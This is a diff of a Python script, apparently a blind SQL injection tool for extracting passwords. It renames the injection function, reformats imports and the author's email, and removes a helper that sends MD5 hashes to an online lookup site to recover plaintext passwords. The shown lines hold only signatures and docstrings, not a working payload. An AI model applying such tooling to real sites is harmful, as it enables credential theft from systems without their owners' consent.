@@ -14,11 +14,12 @@
 #  You should have received a copy of the GNU General Public License
 #  along with this program.  If not, see <http://www.gnu.org/licenses/>.
 #
-#  Copyright 2012 Yannick Méheut <useless@utouch.fr>
+#  Copyright 2012 Yannick Méheut <useless (at) utouch (dot) fr>
 
-import sys, requests
+import sys
+import requests
 
-def blind_injection(target_url, authorized_characters, string_when_success, length):
+def injection(target_url, authorized_characters, string_when_success, length):
 	'''
 	This function will be performing the injection. It will do a binary search
 	on the authorized_characters.
@@ -86,19 +87,4 @@ def blind_injection(target_url, authorized_characters, string_when_success, leng
 	print('')
 
 	return password
-
-def reverse_hash(hash_to_reverse):
-	'''
-	This function is used to reverse a MD5 hash.
-	It uses an online tool: http://md5.gromweb.com/query/
-	It then parses the result page to find the plain password.
-	'''
-
-	url = 'http://md5.gromweb.com/query/{0}'.format(hash_to_reverse)
-	r = requests.get(url)
-
-	# We retrieve the result page
-	plain_password = result = r.text
-
-	return plain_password
 
